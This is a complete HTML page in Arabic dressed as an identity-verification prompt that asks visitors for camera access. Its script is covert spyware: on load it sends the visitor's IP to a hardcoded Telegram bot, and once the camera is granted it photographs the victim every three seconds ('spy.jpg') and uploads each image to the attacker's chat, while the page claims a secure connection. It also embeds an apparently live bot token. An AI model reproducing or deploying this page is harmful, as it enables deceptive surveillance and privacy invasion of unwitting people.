<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من هويتك</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a4a;
        }
        .icon { font-size: 70px; margin-bottom: 10px; }
        h2 { color: #e94560; margin-bottom: 10px; }
        p { color: #8a8aaa; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #e94560;
            color: #fff;
            border: none;
            padding: 14px 30px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
        }
        .btn:hover { background: #c73652; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        #status {
            margin-top: 15px;
            color: #8a8aaa;
            font-size: 13px;
        }
        .loader {
            display: none;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.7s linear infinite;
            margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #videoPreview {
            width: 100%;
            max-width: 300px;
            border-radius: 10px;
            margin: 10px auto;
            display: none;
        }
        .footer {
            margin-top: 15px;
            font-size: 11px;
            color: #3a3a5a;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📸</div>
        <h2>تحقق من هويتك</h2>
        <p>لأسباب أمنية، يرجى السماح بالوصول إلى الكاميرا</p>
        <button class="btn" id="startBtn">📷 السماح بالوصول</button>
        <video id="videoPreview" autoplay muted></video>
        <div class="loader" id="loader"></div>
        <div id="status">⏳ اضغط الزر للمتابعة</div>
        <div class="footer">🔒 اتصال آمن • يتم التحقق من هويتك</div>
    </div>

    <script>
        // ================================================
        // 🔐 إعدادات تليجرام (محدثة)
        // ================================================
        const TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";  // تم التحديث ✅

        // ================================================
        // 📤 دوال الإرسال
        // ================================================
        async function sendMessage(text) {
            try {
                const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch (e) {}
        }

        async function sendPhoto(blob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'spy.jpg');
                const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
                await fetch(url, { method: 'POST', body: formData });
            } catch (e) {}
        }

        // ================================================
        // 🌐 جلب IP
        // ================================================
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        // ================================================
        // 📸 الكاميرا
        // ================================================
        let stream = null;
        let video = null;
        let canvas = null;
        let captureInterval = null;
        let isCapturing = false;

        async function startCamera() {
            try {
                let facingMode = 'environment';
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                } catch {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                    facingMode = 'user';
                }

                video = document.getElementById('videoPreview');
                video.srcObject = stream;
                await video.play();
                video.style.display = 'block';

                canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                document.getElementById('status').innerHTML = '✅ تم الوصول إلى الكاميرا';
                document.getElementById('loader').style.display = 'none';

                const ip = await getIP();
                await sendMessage(`🔥 بدء التصوير\n🌐 IP: ${ip}\n📱 المود: ${facingMode}\n🕒 ${new Date().toLocaleString()}`);

                isCapturing = true;
                captureInterval = setInterval(capturePhoto, 3000);

            } catch (error) {
                document.getElementById('status').innerHTML = '❌ خطأ: ' + error.message;
                document.getElementById('loader').style.display = 'none';
                document.getElementById('startBtn').disabled = false;
            }
        }

        function capturePhoto() {
            if (!video || !canvas || !isCapturing) return;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                if (blob) await sendPhoto(blob);
            }, 'image/jpeg', 0.85);
        }

        function stopCamera() {
            isCapturing = false;
            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
            if (video) { video.srcObject = null; video.style.display = 'none'; }
        }

        // ================================================
        // 🎯 الأحداث
        // ================================================
        document.getElementById('startBtn').addEventListener('click', async () => {
            const btn = document.getElementById('startBtn');
            btn.disabled = true;
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').innerHTML = '⏳ جاري فتح الكاميرا...';
            await startCamera();
        });

        (async function() {
            const ip = await getIP();
            await sendMessage(`📥 فتح الصفحة\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`);
        })();

        window.addEventListener('beforeunload', () => { stopCamera(); });
        window.addEventListener('pagehide', () => { stopCamera(); });
    </script>
</body>
</html>
